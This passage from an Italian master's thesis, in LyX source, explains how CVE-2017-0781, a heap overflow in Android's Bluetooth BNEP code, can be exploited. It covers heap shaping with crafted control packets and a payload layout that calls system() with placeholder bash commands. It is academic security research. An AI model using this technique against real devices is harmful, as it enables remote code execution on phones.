\begin_layout Plain Layout

}
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout


\backslash
begin{bytefield}{10}
\end_layout

\begin_layout Plain Layout

	
\backslash
wordbox[]{1}{
\backslash
texttt{btu
\backslash
_hci
\backslash
_msg
\backslash
_queue}} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

	
\backslash
skippedwords 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

	
\backslash
wordbox[lrb]{1}{
\backslash
dots} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

	
\backslash
begin{leftwordgroup}{
\backslash
texttt{p
\backslash
_pending
\backslash
_data}}
\end_layout

\begin_layout Plain Layout

		
\backslash
colormemsection{2}{blue!15}{
\backslash
texttt{event}} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

		
\backslash
colormemsection{2}{blue!15}{
\backslash
texttt{len} 
\backslash
(=
\backslash
) 
\backslash
texttt{rem
\backslash
_len}} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

		
\backslash
colormemsection{2}{blue!15}{
\backslash
texttt{offset
\backslash
(=0
\backslash
)}} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

		
\backslash
colormemsection{2}{blue!15}{
\backslash
texttt{layer
\backslash
_specific}}
\end_layout

\begin_layout Plain Layout

	
\backslash
end{leftwordgroup} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

	
\backslash
begin{leftwordgroup}{
\backslash
texttt{list
\backslash
_node
\backslash
_t}}
\end_layout

\begin_layout Plain Layout

		
\backslash
colormemsection{4}{red!15}{
\backslash
texttt{next} 
\backslash

\backslash
 
\backslash
small 
\backslash
(0
\backslash
)xCCCCCCCC} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

		
\backslash
colormemsection{4}{red!15}{
\backslash
texttt{data} 
\backslash

\backslash
 
\backslash
small 
\backslash
(0
\backslash
)x
\backslash
(41414141
\backslash
)}
\end_layout

\begin_layout Plain Layout

	
\backslash
end{leftwordgroup} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

	
\backslash
wordbox[lrt]{1}{
\backslash
dots} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

	
\backslash
skippedwords 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout


\backslash
end{bytefield}
\end_layout

\end_inset


\end_layout

\begin_layout Plain Layout
\begin_inset Caption Standard

\begin_layout Plain Layout
\begin_inset CommandInset label
LatexCommand label
name "fig:bnep-heap-with-list-node-after-overflow"

\end_inset

Illustrazione dell'heap dopo l'overflow che porta al crash del demone Bluetooth
\end_layout

\end_inset


\end_layout

\end_inset


\end_layout

\begin_layout Standard
Questo significa che per sfruttare l'
\emph on
overflow
\emph default
 dobbiamo fare in modo di allocare quanti più oggetti di tipo 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

list_node_t
\end_layout

\end_inset

 possibile con degli spazi non allocati tra uno e l'altro.
 In questo modo, al momento di allocare la memoria per il buffer 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

p_pending_data
\end_layout

\end_inset

, la scelta ricadrà su uno di questi spazi.
\end_layout

\begin_layout Standard
\begin_inset VSpace defskip
\end_inset


\end_layout

\begin_layout Standard
La situazione ideale nell'heap subito prima di inviare il pacchetto che
 induce l'overflow sarebbe quella mostrata in Figura 
\begin_inset CommandInset ref
LatexCommand vref
reference "fig:heap-spraying-ideal-situation"

\end_inset

.
\end_layout

\begin_layout Standard
\align center
\begin_inset Float figure
placement H
wide false
sideways false
status open

\begin_layout Plain Layout
\align center
\begin_inset Graphics
	filename /home/mrnfrancesco/git/master-thesis/gfx/heap-spraying-ideal-situation.png
	display false
	width 100col%

\end_inset


\end_layout

\begin_layout Plain Layout
\begin_inset Caption Standard

\begin_layout Plain Layout
\begin_inset CommandInset label
LatexCommand label
name "fig:heap-spraying-ideal-situation"

\end_inset

Situazione ideale dell'heap prima dell'invio del pacchetto che porta all'overflo
w
\end_layout

\end_inset


\end_layout

\begin_layout Plain Layout

\end_layout

\end_inset


\end_layout

\begin_layout Standard
In questo caso il prossimo buffer di 
\begin_inset Formula $8$
\end_inset

 byte ad essere allocato risiederà esattamente prima dell'oggetto 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

list_node_t
\end_layout

\end_inset

.
 Per far sì che questo 
\emph on
layout
\emph default
 occorra con maggiore probabilità, è necessario che l'oggetto 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

list_node_t
\end_layout

\end_inset

 che vogliamo sovrascrivere tramite overflow risieda esattamente dopo il
 primo spazio della 
\begin_inset Quotes eld
\end_inset


\emph on
run
\emph default

\begin_inset Quotes erd
\end_inset

 che verrà utilizzata per l'allocazione.
\end_layout

\begin_layout Standard
Mentre è semplice per l'attaccante creare molti oggetti 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

list_node_t
\end_layout

\end_inset

 appartenenti alla coda 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

btu_hci_msg_queue
\end_layout

\end_inset

 semplicemente inviando molti datagrammi alla vittima, questo non è sufficiente
 per ottenere il layout mostrato perché gli oggetti 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

list_node_t
\end_layout

\end_inset

 verrebbero allocati (e deallocati) in un ordine preciso non permettendo
 quindi di creare degli spazi come sperato.
 Avremmo infatti una situazione come quella mostrata in Figura 
\begin_inset CommandInset ref
LatexCommand vref
reference "fig:heap-spraying-not-ideal-situation"

\end_inset

, ben diversa da quella sperata.
\end_layout

\begin_layout Standard
\align center
\begin_inset Float figure
placement H
wide false
sideways false
status open

\begin_layout Plain Layout
\align center
\begin_inset Graphics
	filename /home/mrnfrancesco/git/master-thesis/gfx/heap-spraying-not-ideal-situation.png
	display false
	width 100col%

\end_inset


\end_layout

\begin_layout Plain Layout
\begin_inset Caption Standard

\begin_layout Plain Layout
\begin_inset CommandInset label
LatexCommand label
name "fig:heap-spraying-not-ideal-situation"

\end_inset

Situazione dell'heap se semplicemente inviassimo tanti pacchetti che creano
 oggetti list_node_t
\end_layout

\end_inset


\end_layout

\end_inset


\end_layout

\begin_layout Standard
In questo caso, gli oggetti 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

list_node_t
\end_layout

\end_inset

 verrebbero allocati una volta ricevuti i pacchetti e solo successivamente
 gestiti dalla funzione 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

bnep_data_ind
\end_layout

\end_inset

.
 Tuttavia, gli oggetti 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

p_pending_data
\end_layout

\end_inset

 verrebbero allocati 
\series bold
dopo
\series default
 l'ultimo 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

list_node_t
\end_layout

\end_inset

 sull'heap non permettendo l'overflow necessario per sfruttare la vulnerabilità.
\end_layout

\begin_layout Standard
Gli spazi tra gli oggetti 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

list_node_t
\end_layout

\end_inset

 verrebbero creati una volta deallocati i nodi già gestiti, ma è improbabile
 che questi risiedano immediatamente prima un oggetto 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

list_node_t
\end_layout

\end_inset

, come mostrato in Figura 
\begin_inset CommandInset ref
LatexCommand vref
reference "fig:heap-spraying-no-holes"

\end_inset

.
\end_layout

\begin_layout Standard
\align center
\begin_inset Float figure
placement H
wide false
sideways false
status open

\begin_layout Plain Layout
\align center
\begin_inset Graphics
	filename /home/mrnfrancesco/git/master-thesis/gfx/heap-spraying-no-holes.png
	display false
	width 100col%

\end_inset


\end_layout

\begin_layout Plain Layout
\begin_inset Caption Standard

\begin_layout Plain Layout
\begin_inset CommandInset label
LatexCommand label
name "fig:heap-spraying-no-holes"

\end_inset

Situazione dell'heap dopo la deallocazione dei nodi gestiti
\end_layout

\end_inset


\end_layout

\end_inset


\end_layout

\begin_layout Standard
In questa situazione, è più probabile che uno spazio esista tra due oggetti
 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

p_pending_data
\end_layout

\end_inset

 e 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

list_node_t
\end_layout

\end_inset

, quindi è necessaria una strategia che permetta di creare spazi casualmente
 sull'heap tra due oggetti 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

list_node_t
\end_layout

\end_inset

.
\end_layout

\begin_layout Standard
A questo scopo può essere utilizzata un'altra coda di oggetti 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

list_node_t
\end_layout

\end_inset

, ad esempio quelli di risposta inviati dalla vittima all'attaccante.
 Più precisamente è possibile fare in modo che la funzione 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

bnep_data_ind
\end_layout

\end_inset

 trasmetta molti pacchetti di risposta di tipo 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

COMMAND_NOT_UNDERSTOOD
\end_layout

\end_inset

, come mostrato nel seguente estratto:
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline false
status open

\begin_layout Plain Layout

...
\end_layout

\begin_layout Plain Layout

	if (extension_present) {
\end_layout

\begin_layout Plain Layout

		...
\end_layout

\begin_layout Plain Layout

		org_len = rem_len;
\end_layout

\begin_layout Plain Layout

		new_len = 0;
\end_layout

\begin_layout Plain Layout

		do {
\end_layout

\begin_layout Plain Layout

			ext = *p++;
\end_layout

\begin_layout Plain Layout

			length = *p++;
\end_layout

\begin_layout Plain Layout

			p += length;
\end_layout

\begin_layout Plain Layout

			if ((!(ext & 0x7F)) &&
\end_layout

\begin_layout Plain Layout

				(*p > BNEP_FILTER_MULTI_ADDR_RESPONSE_MSG))
\end_layout

\begin_layout Plain Layout

					bnep_send_command_not_understood (p_bcb, *p);
\end_layout

\begin_layout Plain Layout

			new_len += (length + 2);
\end_layout

\begin_layout Plain Layout

			if (new_len > org_len)
\end_layout

\begin_layout Plain Layout

				break;
\end_layout

\begin_layout Plain Layout

		} while (ext & 0x80);
\end_layout

\begin_layout Plain Layout

	}
\end_layout

\begin_layout Plain Layout

...
\end_layout

\end_inset


\end_layout

\begin_layout Standard
Questo estratto invia un pacchetto di risposta di tipo 
\begin_inset listings
lstparams "language={C++},breaklines=true,tabsize=4"
inline true
status open

\begin_layout Plain Layout

COMMAND_NOT_UNDERSTOOD
\end_layout

\end_inset

 per ogni pacchetto di controllo BNEP che presenti nel campo 
\emph on
Control Type
\emph default
 un valore superiore al massimo consentito.
 Lo stesso vale nel caso di 
\emph on
extension header
\emph default
 aggiunti allo stesso pacchetto.
\end_layout

\begin_layout Standard
Il valore massimo consentito per il campo 
\emph on
Control Type
\emph default
 è 
\begin_inset Formula $0\text{x}06$
\end_inset

 corrispondente al messaggio di risposta 
\begin_inset listings
lstparams "language={C++},breaklines=true,tabsize=4"
inline true
status open

\begin_layout Plain Layout

BNEP_FILTER_MULTI_ADDR_RESPONSE_MSG
\end_layout

\end_inset

.
\end_layout

\begin_layout Standard
Un pacchetto che rispetti i requisiti necessari è del tipo mostrato in Figura
 
\begin_inset CommandInset ref
LatexCommand vref
reference "fig:heap-shaping-packet-format"

\end_inset

:
\end_layout

\begin_layout Standard
\align center
\begin_inset Float figure
placement h
wide false
sideways false
status open

\begin_layout Plain Layout
\align center
\begin_inset ERT
status open

\begin_layout Plain Layout


\backslash
newcommand{
\backslash
colorbitbox}[3]{%
\end_layout

\begin_layout Plain Layout

	
\backslash
rlap{
\backslash
bitbox{#2}{
\backslash
color{#1}
\backslash
rule{
\backslash
width}{
\backslash
height}}}%
\end_layout

\begin_layout Plain Layout

	
\backslash
bitbox{#2}{#3}}
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout


\backslash
begin{bytefield}[%
\end_layout

\begin_layout Plain Layout

	boxformatting={
\backslash
centering
\backslash
itshape},
\end_layout

\begin_layout Plain Layout

	bitwidth=1em]{24}
\end_layout

\begin_layout Plain Layout

	
\backslash
bitheader[endianness=little]{0,6,7,8,15,16,23} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

		
\backslash
colorbitbox{blue!15}{7}{
\backslash
scriptsize BNEP Type = 
\backslash
(0x01
\backslash
)} &
\end_layout

\begin_layout Plain Layout

		
\backslash
colorbitbox{blue!15}{1}{
\backslash
tiny E 
\backslash

\backslash
 
\backslash
tiny (
\backslash
(1
\backslash
))} &
\end_layout

\begin_layout Plain Layout

		
\backslash
colorbitbox{yellow!15}{8}{
\backslash
scriptsize BNEP Control Type = 
\backslash
(0x09
\backslash
)} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

		
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

		
\backslash
colorbitbox{blue!15}{7}{
\backslash
scriptsize Extension Type = 
\backslash
(0x00
\backslash
)} &
\end_layout

\begin_layout Plain Layout

		
\backslash
colorbitbox{blue!15}{1}{
\backslash
tiny E 
\backslash

\backslash
 
\backslash
tiny (
\backslash
(1
\backslash
))} &
\end_layout

\begin_layout Plain Layout

		
\backslash
colorbitbox{blue!15}{8}{
\backslash
scriptsize Extension Length = 
\backslash
(1
\backslash
)} &
\end_layout

\begin_layout Plain Layout

		
\backslash
colorbitbox{yellow!15}{8}{
\backslash
scriptsize BNEP Control Type = 
\backslash
(0x09
\backslash
)} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

		
\backslash
wordbox[]{1}{$
\backslash
vdots$} 
\backslash

\backslash
[1ex]
\end_layout

\begin_layout Plain Layout

		
\backslash
colorbitbox{blue!15}{7}{
\backslash
scriptsize Extension Type = 
\backslash
(0x00
\backslash
)} &
\end_layout

\begin_layout Plain Layout

		
\backslash
colorbitbox{blue!15}{1}{
\backslash
tiny E 
\backslash

\backslash
 
\backslash
tiny (
\backslash
(1
\backslash
))} &
\end_layout

\begin_layout Plain Layout

		
\backslash
colorbitbox{blue!15}{8}{
\backslash
scriptsize Extension Length = 
\backslash
(1
\backslash
)} &
\end_layout

\begin_layout Plain Layout

		
\backslash
colorbitbox{yellow!15}{8}{
\backslash
scriptsize BNEP Control Type = 
\backslash
(0x09
\backslash
)} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

		
\backslash
colorbitbox{blue!15}{7}{
\backslash
scriptsize Extension Type = 
\backslash
(0x00
\backslash
)} &
\end_layout

\begin_layout Plain Layout

		
\backslash
colorbitbox{blue!15}{1}{
\backslash
tiny E 
\backslash

\backslash
 
\backslash
tiny (
\backslash
(1
\backslash
))} &
\end_layout

\begin_layout Plain Layout

		
\backslash
colorbitbox{blue!15}{8}{
\backslash
scriptsize Extension Length = 
\backslash
(1
\backslash
)} &
\end_layout

\begin_layout Plain Layout

		
\backslash
colorbitbox{yellow!15}{8}{
\backslash
scriptsize BNEP Control Type = 
\backslash
(0x09
\backslash
)} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout


\backslash
end{bytefield}
\end_layout

\end_inset


\end_layout

\begin_layout Plain Layout
\begin_inset Caption Standard

\begin_layout Plain Layout
\begin_inset CommandInset label
LatexCommand label
name "fig:heap-shaping-packet-format"

\end_inset

Formato del pacchetto di controllo BNEP che permette di fare shaping della
 memoria heap
\end_layout

\end_inset


\end_layout

\end_inset


\end_layout

\begin_layout Standard
Questo fa in modo di invocare la funzione 
\begin_inset listings
lstparams "language={C++},breaklines=true,tabsize=4"
inline true
status open

\begin_layout Plain Layout

bnep_send_command_not_understood
\end_layout

\end_inset

 una volta per l'header BNEP e una volta per ogni 
\emph on
extension header
\emph default
.
 I pacchetti di risposta vengono passati alla funzione 
\begin_inset listings
lstparams "language={C++},breaklines=true,tabsize=4"
inline true
status open

\begin_layout Plain Layout

bnepu_check_send_packet
\end_layout

\end_inset

 che, se la connessione L2CAP risulta congestionata, li inserisce nella
 coda 
\begin_inset listings
lstparams "language={C++},breaklines=true,tabsize=4"
inline true
status open

\begin_layout Plain Layout

xmit_q
\end_layout

\end_inset

 per essere inviati in un secondo momento (vedi estratti seguenti).
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language={C++},breaklines=true,tabsize=4"
inline false
status open

\begin_layout Plain Layout

void bnep_send_command_not_understood (tBNEP_CONN *p_bcb, UINT8 cmd_code)
\end_layout

\begin_layout Plain Layout

{
\end_layout

\begin_layout Plain Layout

	BT_HDR *p_buf = (BT_HDR *)osi_malloc(BNEP_BUF_SIZE);
\end_layout

\begin_layout Plain Layout

	...
\end_layout

\begin_layout Plain Layout

	bnepu_check_send_packet (p_bcb, p_buf);
\end_layout

\begin_layout Plain Layout

}
\end_layout

\end_inset


\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language={C++},breaklines=true,tabsize=4"
inline false
status open

\begin_layout Plain Layout

void bnepu_check_send_packet (tBNEP_CONN *p_bcb, BT_HDR *p_buf)
\end_layout

\begin_layout Plain Layout

{
\end_layout

\begin_layout Plain Layout

	if (p_bcb->con_flags & BNEP_FLAGS_L2CAP_CONGESTED) {
\end_layout

\begin_layout Plain Layout

		...
\end_layout

\begin_layout Plain Layout

		fixed_queue_enqueue(p_bcb->xmit_q, p_buf);
\end_layout

\begin_layout Plain Layout

		...
\end_layout

\begin_layout Plain Layout

	} else {
\end_layout

\begin_layout Plain Layout

		L2CA_DataWrite (p_bcb->l2cap_cid, p_buf);
\end_layout

\begin_layout Plain Layout

	}
\end_layout

\begin_layout Plain Layout

}
\end_layout

\end_inset


\end_layout

\begin_layout Standard
Questo significa che, se subito prima di inviare i datagrammi che inducono
 l'overflow inviamo un pacchetto di controllo con un numero sufficientemente
 elevato di 
\emph on
extension header
\emph default
 (vedi Figura 
\begin_inset CommandInset ref
LatexCommand ref
reference "fig:heap-shaping-packet-format"

\end_inset

), la funzione 
\begin_inset listings
lstparams "language={C++},breaklines=true,tabsize=4"
inline true
status open

\begin_layout Plain Layout

bnep_data_ind
\end_layout

\end_inset

 gestirà per primi i messaggi di risposta.
 Quindi, prima di tutto verranno allocati gli oggetti 
\begin_inset listings
lstparams "language={C++},breaklines=true,tabsize=4"
inline true
status open

\begin_layout Plain Layout

list_node_t
\end_layout

\end_inset

 appartenenti alla coda 
\begin_inset listings
lstparams "language={C++},breaklines=true,tabsize=4"
inline true
status open

\begin_layout Plain Layout

xmit_q
\end_layout

\end_inset

; in secondo luogo, dato che vengono tolti e deallocati nodi dalla coda
 
\begin_inset listings
lstparams "language={C++},breaklines=true,tabsize=4"
inline true
status open

\begin_layout Plain Layout

xmit_q
\end_layout

\end_inset

 in un thread differente, questo permette la costruzione di spazi in posizione
 
\begin_inset Quotes eld
\end_inset

casuali
\begin_inset Quotes erd
\end_inset

, come necessario.
 
\end_layout

\begin_layout Standard
Per illustrare, il 
\emph on
layout
\emph default
 dell'heap risulterebbe come in Figura 
\begin_inset CommandInset ref
LatexCommand vref
reference "fig:heap-spraying-with-holes"

\end_inset

.
\end_layout

\begin_layout Standard
\align center
\begin_inset Float figure
placement H
wide false
sideways false
status open

\begin_layout Plain Layout
\align center
\begin_inset Graphics
	filename /home/mrnfrancesco/git/master-thesis/gfx/heap-spraying-with-holes.png
	display false
	width 100col%

\end_inset


\end_layout

\begin_layout Plain Layout
\begin_inset Caption Standard

\begin_layout Plain Layout
\begin_inset CommandInset label
LatexCommand label
name "fig:heap-spraying-with-holes"

\end_inset

Layout dell'heap dopo la creazione di spazi casuali
\end_layout

\end_inset


\end_layout

\end_inset


\end_layout

\begin_layout Standard
In questo scenario quando la funzione 
\begin_inset listings
lstparams "language={C++},breaklines=true,tabsize=4"
inline true
status open

\begin_layout Plain Layout

bnep_data_ind
\end_layout

\end_inset

 gestirà i pacchetti che inducono l'overflow, il nuovo oggetto 
\begin_inset listings
lstparams "language={C++},breaklines=true,tabsize=4"
inline true
status open

\begin_layout Plain Layout

p_pending_data
\end_layout

\end_inset

 verrà allocato verosimilmente nello spazio di 
\begin_inset Formula $8$
\end_inset

 byte presente.
 A questo punto, l'overflow sovrascriverà i dati dell'oggetto 
\begin_inset listings
lstparams "language={C++},breaklines=true,tabsize=4"
inline true
status open

\begin_layout Plain Layout

list_node_t
\end_layout

\end_inset

 subito successivo permettendo di completare l'attacco con alta probabilità
 di successo.
\end_layout

\begin_layout Section
Costruzione del payload
\begin_inset CommandInset label
LatexCommand label
name "sec:payload-building"

\end_inset


\end_layout

\begin_layout Standard
Da quanto spiegato finora capiamo che, per ottenere una 
\begin_inset Flex CT - acronym
status collapsed

\begin_layout Plain Layout

RCE
\end_layout

\end_inset

, è necessario fare in modo che l'indirizzo utilizzato nell'
\emph on
overflow
\emph default
 punti a un 
\emph on
payload
\emph default
 già presente in memoria costruito in modo tale che:
\end_layout

\begin_layout Itemize
all'
\emph on
offset
\emph default
 
\begin_inset Formula $8$
\end_inset

 ci sia l'indirizzo di una funzione che prenda in input un parametro
\end_layout

\begin_layout Itemize
che il parametro della funzione del punto precedente sarà lo stesso 
\emph on
payload
\emph default
 all'
\emph on
offset
\emph default
 
\begin_inset Formula $0$
\end_inset


\end_layout

\begin_layout Itemize
il 
\emph on
payload
\emph default
 deve innescare l'evento 
\begin_inset listings
lstparams "language={C++},breaklines=true,tabsize=4"
inline true
status open

\begin_layout Plain Layout

BTU_POST_TO_TASK_NO_GOOD_HORRIBLE_HACK
\end_layout

\end_inset


\end_layout

\begin_layout Standard
La funzione che meglio si presta a questo scopo è la 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

system
\end_layout

\end_inset

 il cui unico parametro è una stringa che contiene i comandi da eseguire.
 Il 
\emph on
payload
\emph default
 assumerebbe quindi la seguente forma:
\end_layout

\begin_layout Standard
\align center
\begin_inset Float table
placement H
wide false
sideways false
status open

\begin_layout Plain Layout
\begin_inset ERT
status open

\begin_layout Plain Layout


\backslash
newcommand{
\backslash
colorbitbox}[3]{%
\end_layout

\begin_layout Plain Layout

	
\backslash
rlap{
\backslash
bitbox{#2}{
\backslash
color{#1}
\backslash
rule{
\backslash
width}{
\backslash
height}}}%
\end_layout

\begin_layout Plain Layout

	
\backslash
bitbox{#2}{#3}}
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout


\backslash
newcommand{
\backslash
bitlabel}[2]{%
\end_layout

\begin_layout Plain Layout

	
\backslash
bitbox[]{#1}{%
\end_layout

\begin_layout Plain Layout

		
\backslash
raisebox{0pt}[4ex][0pt]{%
\end_layout

\begin_layout Plain Layout

			
\backslash
turnbox{45}{
\backslash
fontsize{7}{7}
\backslash
selectfont#2}%
\end_layout

\begin_layout Plain Layout

		}%
\end_layout

\begin_layout Plain Layout

	}%
\end_layout

\begin_layout Plain Layout

}
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout


\backslash
begin{bytefield}[bitwidth=1.5em, bitheight=2em]{22}
\end_layout

\begin_layout Plain Layout

	
\backslash
bitbox[]{1}{} &
\end_layout

\begin_layout Plain Layout

	
\backslash
bitlabel{1}{"Horrible Hack"} &
\end_layout

\begin_layout Plain Layout

	
\backslash
bitbox[]{2}{} &
\end_layout

\begin_layout Plain Layout

	
\backslash
bitlabel{1}{
\backslash
quad Padding} &
\end_layout

\begin_layout Plain Layout

	
\backslash
bitbox[]{4}{} &
\end_layout

\begin_layout Plain Layout

	
\backslash
bitlabel{1}{Indirizzo 
\backslash
texttt{system}} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

	
\backslash
bitheader{0,1,2,8,11,12} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

	
\backslash
bitbox{1}{
\backslash
texttt{??}} &
\end_layout

\begin_layout Plain Layout

	
\backslash
colorbitbox{red!15}{1}{
\backslash
(17
\backslash
)} &
\end_layout

\begin_layout Plain Layout

	
\backslash
bitbox{6}{
\backslash
texttt{?? ?? ?? ?? ?? ??}} &
\end_layout

\begin_layout Plain Layout

	
\backslash
colorbitbox{red!15}{4}{
\backslash
texttt{system} 
\backslash

\backslash
 
\backslash
tiny 
\backslash
texttt{?? ?? ?? ??}} &
\end_layout

\begin_layout Plain Layout

	
\backslash
bitbox{10}{
\backslash
dots} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

 
\backslash
end{bytefield}
\end_layout

\end_inset


\end_layout

\begin_layout Plain Layout
\begin_inset Caption Standard

\begin_layout Plain Layout
\begin_inset CommandInset label
LatexCommand label
name "tab:cve-2017-0781-payload-constraints"

\end_inset

Vincoli del payload da usare per sfruttare la vulnerabilità CVE-2017-0781
\end_layout

\end_inset


\end_layout

\end_inset


\end_layout

\begin_layout Standard
Ora, come abbiamo già detto questo stesso payload è sia utilizzato per creare
 un pacchetto valido di tipo 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

BT_HDR
\end_layout

\end_inset

 sia come parametro stesso della funzione 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

system
\end_layout

\end_inset

.
 Questo significa che l'intero payload, oltre che rispettare i vincoli evidenzia
ti in Tabella 
\begin_inset CommandInset ref
LatexCommand ref
reference "tab:cve-2017-0781-payload-constraints"

\end_inset

, deve anche contenere uno o più comandi bash validi.
\end_layout

\begin_layout Standard
Un payload che rispetti tutti questi vincoli può essere il seguente:
\end_layout

\begin_layout Standard
\align center
\begin_inset Float table
placement H
wide false
sideways false
status open

\begin_layout Plain Layout
\begin_inset ERT
status open

\begin_layout Plain Layout


\backslash
newcommand{
\backslash
colorbitbox}[3]{%
\end_layout

\begin_layout Plain Layout

	
\backslash
rlap{
\backslash
bitbox{#2}{
\backslash
color{#1}
\backslash
rule{
\backslash
width}{
\backslash
height}}}%
\end_layout

\begin_layout Plain Layout

	
\backslash
bitbox{#2}{#3}}
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout


\backslash
begin{bytefield}[bitwidth=1.5em, bitheight=2em]{20}
\end_layout

\begin_layout Plain Layout

	
\backslash
bitbox{1}{
\backslash
(23
\backslash
)} &
\end_layout

\begin_layout Plain Layout

	
\backslash
colorbitbox{red!15}{1}{
\backslash
(17
\backslash
)} &
\end_layout

\begin_layout Plain Layout

	
\backslash
bitbox{6}{
\backslash
texttt{41 41 41 41 41 41}} &
\end_layout

\begin_layout Plain Layout

	
\backslash
colorbitbox{red!15}{4}{
\backslash
texttt{system} 
\backslash

\backslash
 
\backslash
tiny 
\backslash
texttt{?? ?? ?? ??}} &
\end_layout

\begin_layout Plain Layout

	
\backslash
bitbox{1}{
\backslash
(0
\backslash
)A} &
\end_layout

\begin_layout Plain Layout

	
\backslash
bitbox{5}{
\backslash
texttt{comandi bash}} &
\end_layout

\begin_layout Plain Layout

	
\backslash
bitbox{2}{
\backslash
(0
\backslash
)A 
\backslash
(23
\backslash
)} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

 
\backslash
end{bytefield}
\end_layout

\end_inset


\end_layout

\begin_layout Plain Layout
\begin_inset Caption Standard

\begin_layout Plain Layout
\begin_inset CommandInset label
LatexCommand label
name "tab:cve-2017-0781-payload-format"

\end_inset

Formato del payload da usare per sfruttare la vulnerabilità CVE-2017-0781
\end_layout

\end_inset


\end_layout

\end_inset


\end_layout

\begin_layout Standard
Supponendo di essere riusciti ad eseguire la funzione 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

system
\end_layout

\end_inset

 con questo 
\emph on
payload
\emph default
 come parametro, questo si tradurrebbe nell'esecuzione dei seguenti comandi:
\end_layout

\begin_layout Standard
\align center
\begin_inset Float table
placement H
wide false
sideways false
status open

\begin_layout Plain Layout
\begin_inset ERT
status open

\begin_layout Plain Layout


\backslash
newcommand{
\backslash
colorbitbox}[3]{%
\end_layout

\begin_layout Plain Layout

	
\backslash
rlap{
\backslash
bitbox{#2}{
\backslash
color{#1}
\backslash
rule{
\backslash
width}{
\backslash
height}}}%
\end_layout

\begin_layout Plain Layout

	
\backslash
bitbox{#2}{#3}}
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout


\backslash
begin{bytefield}[bitwidth=1.5em, bitheight=2em]{20}
\end_layout

\begin_layout Plain Layout

	
\backslash
bitbox{1}{
\backslash
#} &
\end_layout

\begin_layout Plain Layout

	
\backslash
colorbitbox{red!15}{1}{
\backslash
scriptsize 
\backslash
textbackslash x
\backslash
(17
\backslash
)} &
\end_layout

\begin_layout Plain Layout

	
\backslash
bitbox{6}{
\backslash
texttt{AAAAAA}} &
\end_layout

\begin_layout Plain Layout

	
\backslash
colorbitbox{red!15}{4}{
\backslash
texttt{system} 
\backslash

\backslash
 
\backslash
tiny 
\backslash
texttt{?? ?? ?? ??}} &
\end_layout

\begin_layout Plain Layout

	
\backslash
bitbox{1}{
\backslash
textbackslash n} &
\end_layout

\begin_layout Plain Layout

	
\backslash
bitbox{5}{
\backslash
texttt{comandi bash}} &
\end_layout

\begin_layout Plain Layout

	
\backslash
bitbox{2}{
\backslash
textbackslash n
\backslash
#} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

 
\backslash
end{bytefield}
\end_layout

\end_inset


\end_layout

